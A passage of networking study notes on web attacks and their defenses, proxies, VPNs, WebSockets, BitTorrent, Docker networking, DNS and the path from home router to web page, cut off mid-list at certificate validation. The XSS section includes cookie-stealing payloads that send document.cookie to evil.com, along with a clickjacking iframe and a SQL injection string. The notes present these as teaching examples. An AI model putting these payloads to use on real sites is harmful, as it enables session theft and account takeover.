- **XSS**: Cross-Site Scripting; attacker gets their JavaScript to run **inside a trusted website**; script runs with that site's origin, so it can read page data, call APIs as the user, steal non-HttpOnly cookies/localStorage tokens, change the page
- **Reflected XSS**: malicious input in a request is immediately reflected into the response without escaping
  - Example: search page renders `You searched for: <query>` as HTML
  - Attacker sends victim a link: `https://shop.com/search?q=<script>fetch('https://evil.com?c='+document.cookie)</script>`
  - Victim clicks → script runs on `shop.com`
- **Stored XSS**: malicious content is saved (e.g. in DB) and later rendered unsafely to other users; more dangerous since it hits every viewer, no link needed
  - Example: comment `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` saved on a blog; everyone who opens that post runs it
- **DOM XSS**: client-side JavaScript takes untrusted data (URL, hash, `postMessage`) and puts it into the page unsafely; server may never see the payload
  - Example: `element.innerHTML = location.hash.slice(1)` → `https://site.com/#<img src=x onerror=alert(1)>` executes
- **XSS defenses**:
  - Escape output based on context (HTML, attribute, URL, JS); React/Vue/Angular escape by default
  - Avoid raw HTML sinks: `innerHTML`, `dangerouslySetInnerHTML`, `v-html`, `eval`; use `textContent` instead
  - If you must render user HTML (rich text), sanitize it (e.g. DOMPurify)
  - `HttpOnly` cookies (script can't read session cookie); **CSP** as a second layer
- **CSP**: Content Security Policy; response header that tells the browser which sources of scripts, styles, images, frames, etc. are allowed; anything else is blocked; limits damage even if XSS slips through

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; frame-ancestors 'none'
```

  - `default-src 'self'` → by default only load from own origin
  - `script-src` → scripts only from own origin + that CDN; inline `<script>` and `onerror=` handlers are blocked (unless `'unsafe-inline'`, which defeats the purpose)
  - `frame-ancestors 'none'` → page can't be embedded in iframes (clickjacking defense)
  - Nonces (`script-src 'nonce-r4nd0m'`) allow specific inline scripts that the server marked
  - Roll out with `Content-Security-Policy-Report-Only` first to see what would break
- **Clickjacking**: attacker loads your site in an invisible iframe on top of their page and tricks the user into clicking buttons on your site (UI redressing)
  - Example: `evil.com` shows "Click to win a prize!"; an invisible iframe of `bank.com/settings` sits exactly over the button, so the user actually clicks "Delete account"

```html
<iframe src="https://bank.com/settings" style="opacity:0; position:absolute; top:0; left:0;"></iframe>
<button>Click to win a prize!</button>
```

  - Defense: `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`), older `X-Frame-Options: DENY`/`SAMEORIGIN`
- **Other common attacks** (worth knowing):
  - **SQL Injection**: user input concatenated into a SQL query; `' OR '1'='1` → login bypass, data dump; defense: parameterized queries / ORM, never string-concatenate SQL
  - **SSRF (Server-Side Request Forgery)**: app fetches a user-given URL from the server, attacker makes it hit internal services (`http://169.254.169.254` cloud metadata → credentials); defense: allowlist destinations, block internal IP ranges
  - **MITM (Man-in-the-Middle)**: attacker sits between client & server (public Wi-Fi, ARP spoofing) to read/modify traffic; defense: HTTPS everywhere, HSTS, proper certificate validation
  - **DNS spoofing**: fake DNS answers send users to the attacker's server; defense: HTTPS (cert won't match), DNSSEC
  - **DDoS (Distributed Denial of Service)**: flood a service with traffic from many machines until it can't serve real users; defense: CDN/WAF (Cloudflare etc.), rate limiting, autoscaling
  - **Open redirect**: `site.com/login?next=https://evil.com` redirects anywhere; used in phishing since the link starts with a trusted domain; defense: allow only relative/allowlisted redirect URLs

## 13. Proxy & Network Infrastructure
- **Proxy**: intermediary between a client and another server; instead of talking directly to the destination, the client talks through the proxy, which forwards the request and relays the response
- **Forward Proxy**: sits in front of **clients** and talks to the internet on their behalf; destination sees the proxy's IP, not the client's
  - Used for: company/school web filtering, logging, caching, hiding client IP, getting around geo-restrictions (VPN-like)
- **Reverse Proxy**: sits in front of **servers**; clients talk to the proxy thinking it's the server; proxy decides which backend handles the request
  - Used for: load balancing, TLS termination, routing (`/api` → API servers, `/` → frontend), caching, compression, rate limiting, hiding backend servers
- **Forward vs Reverse**: forward proxy hides/acts for the **client**; reverse proxy hides/acts for the **server**

```
Forward:  [Clients] → Forward Proxy → Internet → Server
Reverse:  Client → Internet → Reverse Proxy → [Server 1, Server 2, Server 3]
```

- **Nginx**: web server widely used as a reverse proxy, TLS terminator, load balancer, and static file server; alternatives: HAProxy, Envoy, Traefik, Caddy
- **TLS termination**: client's HTTPS connection ends (gets decrypted) at the reverse proxy/load balancer; proxy talks plain HTTP (or new TLS) to the backend
  - Why: proxy can read HTTP paths/headers to route requests and apply rules; certificates managed in one place; backends don't spend CPU on TLS
  - **TLS passthrough**: proxy forwards encrypted traffic as-is (L4); backend handles TLS; proxy can't see HTTP
  - **Re-encryption**: terminate at proxy, then open new TLS to backend; used when internal traffic must also be encrypted (zero-trust, compliance)
- **X-Forwarded-For / X-Forwarded-Proto**: behind a proxy, the backend sees the **proxy's IP** as the client and plain HTTP as the scheme; proxy adds these headers with the real client IP and original scheme (`https`)
  - Only trust them when set by your own proxy; clients can fake them
- **Load Balancer**: distributes incoming traffic across multiple backend instances instead of sending every request to one server; gives scalability (add more instances) and availability (one dies, others keep serving)
- **L4 Load Balancing**: decides based on IP addresses and ports only (Transport layer); doesn't look inside the data
  - Fast, works for any TCP/UDP traffic (databases, raw TCP services, game servers); can't route by URL or header
  - e.g. AWS NLB, HAProxy (TCP mode)
- **L7 Load Balancing**: reads the HTTP request; routes using hostnames, paths, headers, cookies
  - e.g. `api.example.com` → API service, `/images/*` → image service; can also retry, rewrite, add headers
  - More CPU (must terminate TLS and parse HTTP); e.g. AWS ALB, Nginx, Envoy
- **Load balancing algorithms**:
  - **Round robin**: one by one in order; simple, default
  - **Weighted round robin**: bigger servers get more traffic
  - **Least connections**: send to the instance with fewest active connections; good for long/uneven requests
  - **IP hash / consistent hashing**: same client (or key) → same instance
- **Health checks**: load balancer regularly calls each instance (e.g. `GET /health` every 10s) and stops sending traffic to instances that fail; adds them back when they pass again
  - **Liveness**: is the process alive? (if not → restart it)
  - **Readiness**: can it serve traffic right now? (DB connected, warmed up; if not → don't send traffic, but don't restart)
  - Keep `/health` cheap; if it deeply checks a shared DB, a DB blip marks **every** instance unhealthy at once
- **Connection draining**: when removing an instance (deploy, scale down), LB stops sending new requests but lets in-flight requests finish; enables zero-downtime deploys
- **Sticky Sessions**: load balancer sends a client back to the same backend instance across requests (via a cookie or IP hash)
  - Needed when session data is stored in that server's memory
  - Downsides: uneven load, sessions lost if that instance dies, harder scaling
  - Better: keep app servers **stateless** and store sessions in a shared store (Redis/DB) or use tokens
- **API Gateway**: reverse proxy specialized for APIs; single entry point for many backend services; handles auth, rate limiting, request validation, routing, API keys; e.g. Kong, AWS API Gateway
- **CDN (Content Delivery Network)**: network of servers around the world (edge locations) that cache your content close to users
  - User in India gets the file from a Mumbai edge instead of a US server → lower latency, less load on your origin server
  - Caches static files (images, JS, CSS, videos); can also do TLS, DDoS protection, WAF; e.g. Cloudflare, CloudFront, Akamai
  - Controlled via `Cache-Control` headers; after deploy, **cache invalidation** or versioned file names (`app.3f9a2.js`)

## 14. VPN
- **VPN (Virtual Private Network)**: creates an **encrypted tunnel** over the public internet between your device and a VPN server (or between two networks); your device behaves as if it's directly connected to that private network
  - **Virtual**: no physical cable to that network; it's done in software over the existing internet
  - **Private**: traffic inside the tunnel is encrypted; others on the path can't read it
- **What it does**:
  - **Access a private network remotely**: work from home and reach office-only things (internal tools, private DBs, servers with private IPs)
  - **Connect two networks**: office ↔ office, or office ↔ cloud VPC, as if they're one network
  - **Protect traffic on untrusted networks**: public Wi-Fi owner / ISP only see encrypted data going to the VPN server
  - **Change your apparent IP/location**: websites see the VPN server's IP, not yours
- **Tunneling**: putting a whole network packet **inside** another packet (encapsulation); the outer packet gets it across the internet, the inner packet is the real one
- **Virtual network interface**: VPN client creates a fake network card in the OS (`tun0`, `wg0`) with its own private IP (e.g. `10.8.0.2`); OS routing table is updated so selected traffic goes to this interface instead of the real one

- **How it works (step by step)**:
  1. **Connect & authenticate**: VPN client connects to the VPN server and proves who you are (keys, certificates, username/password + MFA)
  2. **Key exchange**: both sides agree on encryption keys (similar idea to the TLS handshake)
  3. **Setup**: client creates the virtual interface, gets a private IP from the VPN, and updates routes (and usually DNS) so traffic goes through the tunnel
  4. **Send**: an app sends a packet to `142.250.1.1` (Google); OS routes it to `tun0`; VPN client takes the **entire original packet**, encrypts it, and wraps it in a new UDP/IP packet addressed to the VPN server
  5. **Travel**: packet goes over your Wi-Fi/ISP like normal traffic; they only see `your IP ↔ VPN server IP`, encrypted, not the real destination or content
  6. **Unwrap & forward**: VPN server decrypts it, gets the original packet back, and forwards it to its destination (for internet traffic, NATs it with its own public IP)
  7. **Return**: response comes back to the VPN server → encrypted & wrapped → sent to your device → client unwraps it → delivered to the app

```
Original packet:  [ IP src=10.8.0.2  dst=142.250.1.1 | TCP | HTTP data ]

Sent on the wire: [ IP src=<your public IP>  dst=<VPN server IP> | UDP | encrypted( original packet ) ]
                    \_____ outer header, visible to ISP ______/      \___ hidden inside tunnel ___/

You → (ISP sees only tunnel) → VPN Server → Google
                                Google sees VPN server's IP
```

- **Types of VPN**:
  - **Remote access VPN**: single device → network (employee laptop → company network; also consumer VPN apps like NordVPN, Proton VPN)
  - **Site-to-site VPN**: network → network; routers/gateways at both ends hold the tunnel, devices don't run any VPN client (office ↔ AWS VPC)
- **Full tunnel vs split tunnel**:
  - **Full tunnel**: **all** traffic goes through the VPN
  - **Split tunnel**: only traffic for certain networks (e.g. company `10.0.0.0/8`) goes through the VPN; rest goes directly to the internet → faster, less load on the VPN server
- **VPN protocols**:
  - **WireGuard**: modern, small codebase, fast, UDP-based; uses public/private key pairs per peer; basis of Tailscale
  - **OpenVPN**: older, TLS-based, works over UDP or TCP (TCP 443 can get through strict firewalls), very flexible
  - **IPsec (with IKEv2)**: works at the IP layer; common for site-to-site and built into OSes/routers/cloud VPN gateways
- **What a VPN does NOT do**:
  - Not anonymity: the VPN provider can see all your traffic (you shift trust from ISP to VPN provider)
  - Doesn't protect against malware, phishing, or tracking via cookies/logins
  - Doesn't add much for content privacy if sites already use HTTPS; mainly hides **which** sites you visit from the local network/ISP
  - **DNS leak**: if DNS queries skip the tunnel, your ISP still sees every domain you visit
- **Engineer notes**:
  - Common use: reach private resources (DB in a private subnet, internal dashboards) without exposing them to the internet
  - **CIDR overlap**: if your home network and office network both use `192.168.1.0/24`, routing breaks; plan non-overlapping private ranges for VPCs/offices
  - **MTU overhead**: tunnel headers take extra bytes, so large packets may need fragmentation or get dropped → "VPN connected but some sites hang"; fix by lowering MTU on the tunnel
  - Alternatives: **bastion host** / SSH tunnel (`ssh -L 5432:db.internal:5432 bastion`) for one-off access; **mesh VPNs** (Tailscale, ZeroTier) and **zero-trust access** (Cloudflare Access) that check user + device per request instead of trusting "anyone inside the network"

## 15. Real-Time Communication
- **Problem**: HTTP is request → response; server can't send data to the client on its own; real-time apps (chat, notifications, live scores, collaborative editing) need the server to **push** updates
- **Short polling**: client asks every N seconds "anything new?"; simple but wasteful (most responses empty) and delayed by up to N seconds
- **Long polling**: client sends a request, server **holds it open** until there's new data (or a timeout), responds, client immediately sends the next request; near real-time over plain HTTP, but a new request per message
- **Simplex / Half-duplex / Full-duplex**:
  - **Simplex**: one direction only (TV broadcast; SSE)
  - **Half-duplex**: both directions, but one at a time (walkie-talkie; HTTP/1.1 request → response)
  - **Full-duplex**: both sides send independently at the same time (phone call; WebSockets)
- **WebSockets**: client and server establish a single TCP connection that **stays open**; after that, either side can send messages whenever it wants; low overhead per message (small frame header instead of full HTTP headers)
  - URLs: `ws://` (plain), `wss://` (over TLS, use this in production)
  - Messages are sent as **frames** (text or binary)
  - Use for: chat, multiplayer games, collaborative editing, live trading dashboards
- **WebSocket handshake**: starts as a normal HTTP/1.1 request asking the server to **upgrade** the same TCP connection to the WebSocket protocol; after `101`, it's no longer HTTP

```
Client → GET /chat HTTP/1.1
         Host: example.com
         Upgrade: websocket
         Connection: Upgrade
         Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
         Sec-WebSocket-Version: 13

Server → HTTP/1.1 101 Switching Protocols
         Upgrade: websocket
         Connection: Upgrade
         Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

  - `Sec-WebSocket-Key` / `Accept`: proves the server really understands WebSocket (not a random HTTP server/cache); not a security feature
  - Browsers send cookies & `Origin` on the handshake → server must check `Origin` (WebSockets aren't covered by CORS)
- **WebSocket lifecycle** (`ws.readyState`): `CONNECTING` (0, handshake in progress) → `OPEN` (1, messages can flow) → `CLOSING` (2, close handshake in progress) → `CLOSED` (3)
  - Either side can close by sending a **close frame** with a code (`1000` normal, `1001` going away); `1006` is reported locally when the connection dropped without any close frame
  - Connections **will** drop (network switch, server deploy, laptop sleep) → client needs reconnect logic with backoff
- **Ping/Pong**: control frames to check the connection is still alive; one side sends `Ping`, the other must reply with `Pong`; no pong in time → treat connection as dead and close it
  - Also keeps idle connections from being cut by proxies/load balancers/NAT that drop idle connections (e.g. Nginx default 60s)
  - Browsers auto-reply to pings but JS **can't send** pings → server sends pings, or the app sends its own heartbeat message
- **Server-Sent Events (SSE)**: server keeps an HTTP response open and streams events to the client over it; **one-way** (server → client only)
  - Response header: `Content-Type: text/event-stream`; browser API: `new EventSource("/events")`
  - Plain HTTP → works with existing proxies, auth, HTTP/2
  - Built-in **auto-reconnect**; resumes from where it left off using `id:` + `Last-Event-ID` header
  - Text only (UTF-8), no binary
  - Over HTTP/1.1 browsers allow only ~6 connections per domain (each open SSE uses one); not an issue with HTTP/2
  - Use for: notifications, live feeds, progress updates, streaming LLM responses (ChatGPT/Claude-style token streaming)

```
data: {"msg": "hello"}

id: 42
event: notification
data: {"msg": "new comment"}
```

- **WebRTC**: peer-to-peer (browser ↔ browser) audio, video, and data; mostly over UDP; used for video calls (Google Meet), screen sharing
  - Still needs a server for **signaling** (exchanging connection info, usually via WebSocket), **STUN** (find your public IP behind NAT), and **TURN** (relay traffic when direct P2P fails)
- **Which one to use**:
  - Server → client updates only (notifications, feeds, AI streaming) → **SSE**
  - Two-way, frequent, low-latency messages (chat, games, collaboration) → **WebSockets**
  - Rare updates, simplest setup → **polling**
  - Audio/video between users → **WebRTC**
- **Engineer notes**:
  - WebSockets/SSE are **stateful, long-lived connections** → each server holds many open connections (memory, file descriptors); plan capacity by concurrent connections, not requests/sec
  - Multiple server instances: user A on server 1, user B on server 2 → use **pub/sub** (Redis, Kafka, NATS) so a message reaches whichever server holds the connection
  - Load balancer/proxy must support Upgrade (Nginx needs `proxy_set_header Upgrade` / `Connection` config) and have long enough idle timeouts
  - Deploys drop all connections → clients must reconnect gracefully (add jitter so all clients don't reconnect at the same moment)
  - Authenticate during the handshake (cookie or token); browser WebSocket API can't set custom headers like `Authorization`

## 16. Peer-to-Peer & BitTorrent
- **Client-server**: everyone downloads from one server; more users → more load on the server → slower for everyone
- **Peer-to-peer (P2P)**: every participant (peer) is both client **and** server; peers download from each other; more users → more upload capacity → can get **faster** as it grows
- **BitTorrent**: most popular P2P file-sharing protocol; a file is downloaded in small pieces from many peers at the same time, and you upload pieces you already have to others
- **Key terms**:
  - **Piece**: file is split into fixed-size pieces (e.g. 256KB - 4MB); each piece downloaded independently
  - **Piece hash**: hash (SHA-1, SHA-256 in v2) of every piece; used to verify each downloaded piece
  - **Peer**: any client in the swarm
  - **Seeder**: peer that has the complete file and only uploads
  - **Leecher**: peer still downloading (also uploads the pieces it has)
  - **Swarm**: all peers sharing the same torrent
  - **Ratio**: uploaded / downloaded
- **`.torrent` file**: small metadata file, **not** the actual content; contains file name(s), sizes, piece size, the list of piece hashes, and tracker URLs
- **Infohash**: hash of the torrent's metadata (info section); unique ID of the torrent across the whole network
- **Magnet link**: link with just the infohash (+ optional trackers); `magnet:?xt=urn:btih:<infohash>`; client finds peers first, then downloads the metadata from them
- **Tracker**: server that keeps a list of peers for each infohash; client asks "who has this torrent?" and gets back peer IP:port list; it **doesn't host any file data**
- **DHT (Distributed Hash Table)**: trackerless peer discovery; peers themselves form a distributed database (Kademlia) storing "infohash → peers"; no central server needed
- **PEX (Peer Exchange)**: connected peers share their own peer lists with each other

- **How a download works (step by step)**:
  1. **Get metadata**: open a `.torrent` file or magnet link → client gets the infohash (and fetches metadata from peers if magnet)
  2. **Find peers**: ask trackers + DHT + PEX → get a list of peer IP:ports
  3. **Connect**: open TCP (or uTP over UDP) connections to many peers; handshake includes the infohash so both sides confirm the same torrent
  4. **Exchange bitfields**: each peer tells which pieces it has
  5. **Request pieces**: ask different pieces from different peers in parallel (pieces are further split into ~16KB blocks)
  6. **Verify**: hash each completed piece and compare with the hash in the metadata; mismatch → discard and re-download (that's why you don't need to trust peers)
  7. **Share**: once verified, announce "I have piece X" to peers and start uploading it to others
  8. **Complete**: all pieces verified → file assembled; client becomes a seeder

```
              Tracker / DHT
          (who has infohash X?)
                  │ peer list
                  ▼
   Peer A ◄──piece 3──► You ◄──piece 7──► Peer B
                         ▲
                     piece 1
                         │
                       Seeder
```

- **Piece selection**:
  - **Rarest first**: download pieces that the fewest peers have first → keeps all pieces available in the swarm even if seeders leave
  - **Random first piece**: grab any piece quickly so you have something to share
  - **Endgame mode**: for the last few pieces, request them from all peers and cancel duplicates → avoids waiting on one slow peer at the end
- **Choking / tit-for-tat**: you upload mostly to peers who upload to you the fastest (unchoke them), others are choked; rewards sharing, punishes free-riders
  - **Optimistic unchoke**: periodically unchoke a random peer → gives new peers a chance and discovers faster peers
- **Networking details**:
  - Transport: TCP, or **uTP** (UDP-based, LEDBAT congestion control → backs off when other traffic on your network needs bandwidth)
  - **NAT problem**: peers behind NAT can't accept incoming connections by default; clients use **UPnP / NAT-PMP** to auto open a port on your router, or manual **port forwarding**; behind CGNAT you can only make outgoing connections (fewer peers → slower)
  - Two peers both behind NAT need **hole punching** (same idea as WebRTC's STUN)
  - **Privacy**: your public IP is visible to every peer in the swarm (and anyone monitoring it)
- **Engineer notes**:
  - Protocol itself is legal; widely used for Linux ISOs, game updates/patches, large dataset distribution (Internet Archive)
  - Same idea used internally by companies to distribute large files/deploy artifacts to thousands of servers fast (e.g. Twitter's Murder, Uber's Kraken for Docker images); avoids one storage server becoming a bottleneck
  - Content addressing (identify data by its hash, verify every piece) also powers IPFS and Git

## 17. Docker Networking
- **Container**: an isolated process with its own filesystem, process list, and **network stack**; not a VM (shares the host's kernel)
- **Network namespace**: Linux feature that gives each container its own network stack: its own interfaces, IP address, routing table, ports, and **its own loopback (`localhost`)**
  - `localhost` inside a container = **that container itself**, not your laptop and not other containers
  - Two containers can both listen on port 80 without conflict, since each has its own ports
- **veth pair (virtual ethernet)**: virtual cable with two ends; one end inside the container (`eth0`), other end plugged into a bridge on the host
- **Bridge (`docker0`)**: virtual switch on the host that connects containers on the same Docker network; containers get private IPs like `172.17.0.2`

```
Container A (172.17.0.2) ──veth──┐
                                 ├── docker0 bridge (172.17.0.1) ── NAT ── host eth0 (192.168.1.10) ──→ Internet
Container B (172.17.0.3) ──veth──┘
```

- **Outbound traffic**: container → bridge → host **NAT**s it to the host's IP → internet (same idea as your home router)
- **Inbound traffic / Port publishing**: outside world can't reach container IPs directly; publish a port to map `host port → container port`
  - `docker run -p 8080:80 nginx` → request to `host:8080` is forwarded to the container's port `80`
  - `-p 127.0.0.1:8080:80` → only reachable from the host itself (default `-p 8080:80` binds on `0.0.0.0`, i.e. all interfaces)
  - `EXPOSE 80` in a Dockerfile is **only documentation**; it doesn't publish anything
  - Docker writes its own iptables rules → published ports can **bypass host firewalls like `ufw`**; bind to `127.0.0.1` if a port shouldn't be public
- **Network drivers (types)**:
  - **bridge** (default): containers on a private virtual network on one host; reach the outside via NAT; reach containers from outside via published ports
  - **user-defined bridge** (`docker network create mynet`): same as bridge, but with **built-in DNS** → containers reach each other **by name** (`http://api:3000`); also better isolation; always prefer this over the default bridge
  - **host** (`--network host`): no network isolation; container uses the host's network stack directly; no NAT, no `-p` needed, best performance; port conflicts with host apps; full behavior only on Linux
  - **none** (`--network none`): no networking except loopback; for fully isolated jobs
  - **overlay**: virtual network spanning **multiple hosts** (Docker Swarm); containers on different machines talk as if on one LAN (traffic tunneled between hosts, like a VPN)
  - **macvlan / ipvlan**: container gets its own IP directly on your physical LAN, looks like a real device to the router; for legacy apps/network appliances
- **Docker DNS**: on user-defined networks, Docker runs an embedded DNS server (`127.0.0.11`) that resolves container/service names to their current IPs → never hardcode container IPs (they change on restart)
- **Docker Compose networking**: Compose creates one network per project automatically; every service is reachable by its **service name**

```yaml
services:
  api:
    build: .
    ports:
      - "3000:3000"        # host → api (only needed for access from your laptop)
    environment:
      DATABASE_URL: postgres://user:pass@db:5432/app   # "db", not "localhost"
  db:
    image: postgres:16
    # no ports needed: api reaches db over the compose network
```

  - Inside the network use **container port** (`db:5432`), not the published host port
  - Only publish `ports` for things you need to reach from the host/browser; keeping the DB unpublished is safer
- **Container → host machine**: use `host.docker.internal` (works on Docker Desktop; on Linux add `--add-host=host.docker.internal:host-gateway`)
- **Common bugs**:
  - App inside the container binds to `127.0.0.1` → `-p` mapping doesn't work; bind to `0.0.0.0`
  - App container connects to `localhost:5432` for DB → that's itself; use the service name `db`
  - `port is already allocated` → host port already used by another container/app; change the host side (`-p 8081:80`)
  - Containers on different networks can't reach each other; connect them with `docker network connect`
  - Docker Desktop (Mac/Windows/WSL2) runs containers inside a VM, so container IPs aren't reachable from the host directly; use published ports
- **Useful commands**:
  - `docker network ls` → list networks
  - `docker network inspect <network>` → connected containers, IPs, subnet
  - `docker network create <name>` / `docker network connect <name> <container>`
  - `docker port <container>` → published port mappings
  - `docker exec -it <container> sh` then `curl`/`nslookup`/`ping` → debug from inside the container's network
- **Next step → Kubernetes**: same ideas at cluster scale; containers in a Pod share one network namespace (talk via `localhost`), every Pod gets its own IP, and **Services** give a stable name/IP + load balancing in front of changing Pods

## 18. DNS
> I've written a detailed post on this: [How DNS Really Works: From Browser Cache to ISP Tracking](/blogs/how-dns-really-works). It covers resolution step by step, propagation, negative caching, ISP tracking, and DNS leaks. Below is the quick reference.

- **DNS (Domain Name System)**: the internet's phonebook; translates human-readable names (`google.com`) into IP addresses (`142.250.1.1`); runs mostly over **UDP port 53** (TCP for large responses/zone transfers)
- **Resolution flow**: browser cache → OS cache (+ `/etc/hosts`) → **recursive resolver** (ISP, `8.8.8.8`, `1.1.1.1`) → **root server** → **TLD server** (`.com`) → **authoritative server** (has the actual record) → answer cached at every step on the way back
- **Recursive resolver**: does the full lookup on your behalf and caches results
- **Authoritative name server**: source of truth for a domain's records (where you edit DNS: Cloudflare, Route 53, your registrar)
- **Common records**:
  - **A**: name → IPv4
  - **AAAA**: name → IPv6
  - **CNAME**: name → another name (alias); can't be used on the root domain (`example.com`)
  - **MX**: mail servers for the domain
  - **TXT**: free text; used for domain verification, SPF/DKIM email auth
  - **NS**: which name servers are authoritative for the domain
- **TTL (Time To Live)**: how long (in seconds) resolvers can cache a record; low TTL = changes spread faster but more lookups; lower it **before** a migration
- **DNS propagation**: not really "propagating"; old answers stay in caches until their TTL expires
- **`/etc/hosts`**: local file mapping names to IPs; checked before DNS; handy for local testing (`127.0.0.1 myapp.local`)
- **DoH / DoT (DNS over HTTPS / TLS)**: encrypt DNS queries so the local network/ISP can't read or tamper with them
- **Engineer notes**:
  - "It's always DNS": wrong record, stale cache, or wrong resolver is behind many "the server is down" incidents
  - Inside Docker/K8s, names like `db` or `my-svc.default.svc.cluster.local` are resolved by the internal DNS server, not public DNS
  - Debug: `dig example.com`, `dig +short example.com A`, `dig @1.1.1.1 example.com` (ask a specific resolver), `nslookup example.com`

## 19. Putting It All Together: From Home Router to Web Page
- Everything from the sections above, in one journey: your home network connects to the ISP → your laptop joins Wi-Fi → you open `https://example.com` → the page shows up
- Example values used below:
  - Laptop: private IP `192.168.1.23`, MAC `aa:aa:aa:aa:aa:aa`
  - Home router: LAN IP `192.168.1.1`, MAC `bb:bb:bb:bb:bb:bb`, public IP `198.51.100.7`
  - `example.com` server: `203.0.113.10`

### Part 1: Your home router & the ISP
- **The "router" box at home** is actually many devices in one:
  - **Modem / ONT**: converts the ISP's line signal (fiber light / DSL / cable) into Ethernet (L1)
  - **Router**: connects your home LAN (`192.168.1.0/24`) to the ISP's network; it's your **default gateway** (L3)
  - **NAT**: lets all home devices share the one public IP the ISP gives the router
  - **Switch**: LAN ports, forwards frames by MAC (L2)
  - **Access Point**: Wi-Fi radio, bridges wireless devices into the same LAN
  - **DHCP server**: hands out private IPs to your devices
  - **DNS forwarder**: answers/forwards DNS queries for your devices (often advertises itself, `192.168.1.1`, as the DNS server)
  - **Firewall**: blocks unsolicited inbound connections (NAT already does this mostly)
- **When the router boots and connects to the ISP**:
  1. Physical link comes up to the ISP's equipment (fiber to the ISP's OLT, DSL to the exchange, etc.)
  2. Router authenticates with the ISP (commonly **PPPoE** with a username/password, or DHCP/IPoE based on the line/MAC)
  3. ISP assigns the router's **WAN side**: a public IP (`198.51.100.7`) or a CGNAT IP (`100.64.x.x` range), ISP's DNS servers, and the ISP's gateway as the router's default gateway
  4. Now the router has two sides: **LAN** (private, `192.168.1.1`) and **WAN** (ISP-facing, `198.51.100.7`)
- **What the ISP does**:
  - Gives you access: connects many homes in an area into its network and assigns IPs (public, or shared via CGNAT)
  - Routes your traffic: ISP's network is an **Autonomous System (AS)**; it uses **BGP** to exchange routes with other networks ("I can reach these IP ranges")
  - Connects to the rest of the internet: through **transit** (paying bigger networks) and **peering** (direct exchange with other networks, often at **IXPs - Internet Exchange Points**); traffic to big services (Google, Netflix, Cloudflare) often stays within the country via peering or caches inside the ISP
  - Runs DNS resolvers that your router uses by default
  - The "internet" is just thousands of these networks (ISPs, clouds, CDNs, universities) connected together and agreeing via BGP on how to reach each other

### Part 2: Your laptop joins the network
1. **Wi-Fi connect (L1/L2)**: laptop finds the network (SSID), authenticates with the password (WPA2/WPA3), and both sides derive encryption keys for the Wi-Fi link; laptop now can send frames, but has **no IP yet**
2. **DHCP (getting an IP)** - 4 steps, **DORA**:
   - **Discover**: laptop broadcasts "any DHCP server here?" (src IP `0.0.0.0`, dst `255.255.255.255`, dst MAC `ff:ff:ff:ff:ff:ff`); it only has its MAC to identify itself (chicken-and-egg from section 3)
   - **Offer**: router offers `192.168.1.23`
   - **Request**: laptop says "I'll take `192.168.1.23`"
   - **Ack**: router confirms + sends config: subnet mask `255.255.255.0`, default gateway `192.168.1.1`, DNS server `192.168.1.1`, **lease time** (e.g. 24h; renewed before expiry)
3. **ARP for the gateway**: laptop asks "who has `192.168.1.1`?" → router replies with MAC `bb:bb:bb:bb:bb:bb`; cached in the ARP table
4. Laptop is now **online**: it knows its IP, its network (`/24`), where to send outside traffic (gateway), and whom to ask for DNS

### Part 3: You type `example.com` and press Enter
1. **Browser parses the input**:
   - Is it a URL or a search term? `example.com` looks like a domain → URL
   - No scheme typed → modern browsers try `https://` first; HSTS sites are always upgraded to `https://` (older behavior: try `http://`, get a 301 redirect to `https://`)
   - Checks its **HTTP cache** (fresh cached page? → done, no network) and whether it already has an open connection to this origin to reuse
2. **DNS lookup** (`example.com` → IP):
   - Browser DNS cache → OS DNS cache → `/etc/hosts` → not found
   - OS sends a DNS query over **UDP** to the DNS server from DHCP: `192.168.1.23:53000 → 192.168.1.1:53`
   - Router forwards it to the ISP resolver (or `1.1.1.1`/`8.8.8.8` if configured) → resolver checks its cache, otherwise asks **root** → **`.com` TLD** → **example.com's authoritative server**
   - Answer: `A example.com → 203.0.113.10`, TTL 3600; cached by resolver, OS, and browser
   - Note: this DNS packet itself goes through the same NAT/routing journey described below
3. **Routing decision on the laptop**:
   - Is `203.0.113.10` inside my network `192.168.1.0/24`? **No** → send it to the **default gateway** `192.168.1.1`
   - Gateway's MAC is already in the ARP cache (`bb:bb:...`)
4. **TCP connection (3-way handshake)**:
   - Browser asks OS for a socket and calls `connect(203.0.113.10:443)`; OS picks an **ephemeral port**, say `54321`
   - OS builds the **SYN**, encapsulating at each layer:

```
L4 TCP:   [ src port 54321 | dst port 443 | SYN ]
L3 IP:    [ src 192.168.1.23 | dst 203.0.113.10 | TTL 64 ] + TCP
L2 Wi-Fi: [ src MAC aa:aa:.. | dst MAC bb:bb:.. (router!) ] + IP + TCP
L1:       radio signal
```

   - Note the dst MAC is the **router's**, while the dst IP is the **server's** (hop-to-hop vs end-to-end)
5. **At the home router**:
   - Receives the frame (its MAC) → strips the L2 header → reads the IP header → destination is outside → route to the ISP
   - **NAT**: rewrites `src 192.168.1.23:54321` → `198.51.100.7:40001` and saves the mapping in its **NAT table** (so replies can be sent back to the laptop)
   - Decrements TTL, wraps the packet in a new L2 frame for the ISP link, sends it
   - (If behind CGNAT, the ISP does a second NAT the same way)
6. **Across the internet**:
   - Each router (hop) looks at the destination IP, checks its routing table (built using BGP between networks), picks the next hop, **decrements TTL**, rewrites the L2 header, and forwards
   - Source & destination **IP stay the same** the whole way (after NAT); MACs change at every hop
   - Usually 10-20 hops; `traceroute example.com` shows them
   - Often the "server" is actually the nearest **CDN edge**, not the origin server across the world (anycast IPs route you to the closest one)
7. **SYN-ACK & ACK**: server replies `203.0.113.10:443 → 198.51.100.7:40001`; home router finds `40001` in its NAT table → rewrites dst to `192.168.1.23:54321` → delivers to the laptop by MAC; laptop sends **ACK** → **TCP connection established** (1 RTT)
8. **TLS 1.3 handshake** (section 10, 1 RTT):
   - **ClientHello**: TLS versions, cipher suites, key share, **SNI** = `example.com`, **ALPN** = `h2, http/1.1`
   - **ServerHello**: chosen cipher + server key share → both compute the shared secret; everything after is encrypted
   - **Certificate**: server (using SNI to pick the right one) sends its **leaf certificate** for `example.com` + **intermediate CA** certificate
   - **CertificateVerify**: server signs the handshake so far with the certificate's **private key** → proves it owns the certificate (not just a copy) and that the key share wasn't swapped by a man-in-the-middle
   - **Certificate validation** in the browser:
